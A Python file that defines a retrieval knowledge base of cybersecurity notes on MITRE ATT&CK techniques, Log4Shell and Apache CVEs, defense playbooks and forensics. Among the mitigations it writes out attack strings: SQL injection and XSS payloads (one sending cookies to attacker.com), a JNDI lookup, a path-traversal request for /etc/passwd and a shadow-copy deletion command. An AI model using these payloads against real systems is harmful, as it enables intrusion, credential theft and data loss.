"""
Cybersecurity knowledge chunks for RAG.
Covers MITRE ATT&CK, CVEs, defense playbooks, and forensics.
"""
from dataclasses import dataclass, field


@dataclass
class KnowledgeChunk:
    id:       str
    category: str   # MITRE | CVE | DEFENSE | FORENSICS
    tags:     list[str]
    title:    str
    content:  str


KNOWLEDGE_BASE: list[KnowledgeChunk] = [
    # ── MITRE ATT&CK ─────────────────────────────────────────
    KnowledgeChunk(
        id="mitre-t1190", category="MITRE",
        tags=["sql injection", "web", "initial access"],
        title="T1190 - Exploit Public-Facing Application",
        content=(
            "Adversaries exploit weaknesses in Internet-facing hosts. SQL injection inserts "
            "malicious SQL into entry fields. Union-based: ' UNION SELECT null,username,password "
            "FROM users--. Blind boolean: ' AND 1=1--. Time-based: '; WAITFOR DELAY '0:0:5'--. "
            "Mitigations: WAF (OWASP CRS), parameterized queries, input validation, least-privilege DB accounts."
        ),
    ),
    KnowledgeChunk(
        id="mitre-t1059", category="MITRE",
        tags=["xss", "scripting", "execution"],
        title="T1059.007 - XSS / JavaScript Execution",
        content=(
            "XSS injects client-side scripts into pages. Stored XSS persists in DB; Reflected XSS "
            "is URL-based; DOM-based manipulates the DOM. Payloads: <script>fetch('https://attacker.com?c='+document.cookie)</script>, "
            "<img src=x onerror=alert(1)>. Mitigations: CSP headers, output encoding, HttpOnly cookies."
        ),
    ),
    KnowledgeChunk(
        id="mitre-t1110", category="MITRE",
        tags=["brute force", "credential", "authentication"],
        title="T1110 - Brute Force",
        content=(
            "Brute force gains access when passwords are unknown. Credential stuffing uses leaked pairs. "
            "Password spraying tries common passwords across many accounts. Tools: Hydra, Hashcat, John. "
            "Mitigations: account lockout, MFA, CAPTCHA, rate limiting, anomaly detection on failed logins."
        ),
    ),
    KnowledgeChunk(
        id="mitre-t1566", category="MITRE",
        tags=["phishing", "social engineering", "initial access"],
        title="T1566 - Phishing",
        content=(
            "Spearphishing targets specific individuals. Credential phishing uses fake login pages. "
            "BEC impersonates executives for wire transfers. Evilginx2 bypasses MFA via reverse proxy. "
            "Mitigations: email filtering, DMARC/DKIM/SPF, user training, MFA, link scanning."
        ),
    ),
    KnowledgeChunk(
        id="mitre-t1486", category="MITRE",
        tags=["ransomware", "encryption", "impact"],
        title="T1486 - Data Encrypted for Impact",
        content=(
            "Ransomware encrypts files using AES-256 + RSA-2048 key exchange. Deletes shadow copies: "
            "vssadmin delete shadows /all. Targets: /data/critical/*.db, /backups/*. "
            "Mitigations: offline backups, EDR, network segmentation, application whitelisting, immutable storage."
        ),
    ),
    KnowledgeChunk(
        id="mitre-t1498", category="MITRE",
        tags=["ddos", "network", "impact"],
        title="T1498 - Network Denial of Service",
        content=(
            "Volumetric attacks flood bandwidth. Protocol attacks exploit L3/L4. Application layer targets L7. "
            "HTTP Flood: 100k GET/sec. Slowloris: partial HTTP headers. SYN Flood: half-open TCP connections. "
            "Mitigations: DDoS protection, rate limiting, anycast, traffic scrubbing, CDN."
        ),
    ),
    KnowledgeChunk(
        id="mitre-t1068", category="MITRE",
        tags=["privilege escalation", "exploit", "elevation"],
        title="T1068 - Exploitation for Privilege Escalation",
        content=(
            "Vectors: SUID binaries (find / -perm -4000), kernel exploits (uname -a + searchsploit), "
            "sudo abuse (sudo -l + GTFOBins), DLL hijacking, token impersonation. "
            "Mitigations: patch management, least privilege, ASLR/DEP, privileged access workstations."
        ),
    ),
    KnowledgeChunk(
        id="mitre-t1041", category="MITRE",
        tags=["data exfiltration", "c2", "exfil"],
        title="T1041 - Exfiltration Over C2 Channel",
        content=(
            "Data exfiltrated via DNS tunneling (iodine, dnscat2), HTTPS to attacker C2, ICMP covert channels, "
            "steganography, cloud storage abuse (S3/GDrive). Data compressed + encrypted before transmission. "
            "Mitigations: DLP, network monitoring, egress filtering, data classification, UEBA."
        ),
    ),
    # ── CVEs ─────────────────────────────────────────────────
    KnowledgeChunk(
        id="cve-2021-44228", category="CVE",
        tags=["log4j", "rce", "java", "critical"],
        title="CVE-2021-44228 - Log4Shell RCE (CVSS 10.0)",
        content=(
            "Apache Log4j2 JNDI features allow RCE via attacker-controlled LDAP endpoints. "
            "Payload: ${jndi:ldap://attacker.com/exploit}. Affects Log4j 2.0-2.14.1. "
            "Patch: upgrade to Log4j 2.17.1+. Mitigate: set log4j2.formatMsgNoLookups=true."
        ),
    ),
    KnowledgeChunk(
        id="cve-2021-41773", category="CVE",
        tags=["apache", "path traversal", "rce"],
        title="CVE-2021-41773 - Apache Path Traversal (CVSS 9.8)",
        content=(
            "Apache HTTP Server 2.4.49 path traversal maps URLs outside configured directories. "
            "Payload: GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd. "
            "Patch: upgrade to Apache 2.4.51+. Block: require all denied in config."
        ),
    ),
    KnowledgeChunk(
        id="cve-2023-44487", category="CVE",
        tags=["http2", "ddos", "rapid reset"],
        title="CVE-2023-44487 - HTTP/2 Rapid Reset (CVSS 7.5)",
        content=(
            "HTTP/2 rapid stream reset causes server resource exhaustion. "
            "Affects nginx, Apache, IIS, Cloudflare. "
            "Mitigations: update web servers, implement request rate limiting, use DDoS protection."
        ),
    ),
    # ── Defense Playbooks ─────────────────────────────────────
    KnowledgeChunk(
        id="def-waf", category="DEFENSE",
        tags=["waf", "web", "sql injection", "xss"],
        title="WAF Configuration Best Practices",
        content=(
            "Enable OWASP CRS 3.3+. SQLi rules: block UNION SELECT, OR 1=1, comment sequences. "
            "XSS rules: block <script>, javascript:, onerror=. Anomaly scoring threshold: 5. "
            "Rate limiting: 100 req/min per IP. Log all blocked requests. Use learning mode 2 weeks before enforcement."
        ),
    ),
    KnowledgeChunk(
        id="def-ir", category="DEFENSE",
        tags=["incident response", "forensics", "containment"],
        title="Incident Response Playbook (NIST SP 800-61)",
        content=(
            "1) Preparation: asset inventory, IR team, communication plan. "
            "2) Identification: SIEM alerts, event correlation, scope determination. "
            "3) Containment: isolate systems, block IPs, preserve evidence. "
            "4) Eradication: remove malware, patch vulns, reset credentials. "
            "5) Recovery: restore from clean backups, monitor re-infection. "
            "6) Lessons Learned: document timeline, update playbooks."
        ),
    ),
    KnowledgeChunk(
        id="def-siem", category="DEFENSE",
        tags=["siem", "detection", "rules", "anomaly"],
        title="SIEM Detection Rules",
        content=(
            "Brute force: >5 failed logins in 60s from same IP → HIGH. "
            "SQLi: HTTP 500 + SQL keywords in request → CRITICAL. "
            "XSS: <script> in GET/POST params → HIGH. "
            "Privilege escalation: sudo outside business hours → HIGH. "
            "Data exfil: outbound >100MB to unknown IP → CRITICAL. "
            "Ransomware: mass file rename/extension change → CRITICAL."
        ),
    ),
    # ── Forensics ─────────────────────────────────────────────
    KnowledgeChunk(
        id="for-logs", category="FORENSICS",
        tags=["logs", "analysis", "evidence", "timeline"],
        title="Digital Forensics Log Analysis",
        content=(
            "Key sources: web server logs, auth logs (/var/log/auth.log, Windows Event 4624/4625), "
            "firewall logs, DNS query logs, EDR telemetry. "
            "Timeline: correlate timestamps, normalize timezones. "
            "Preservation: SHA-256 hash all artifacts, chain of custody, write blockers."
        ),
    ),
]
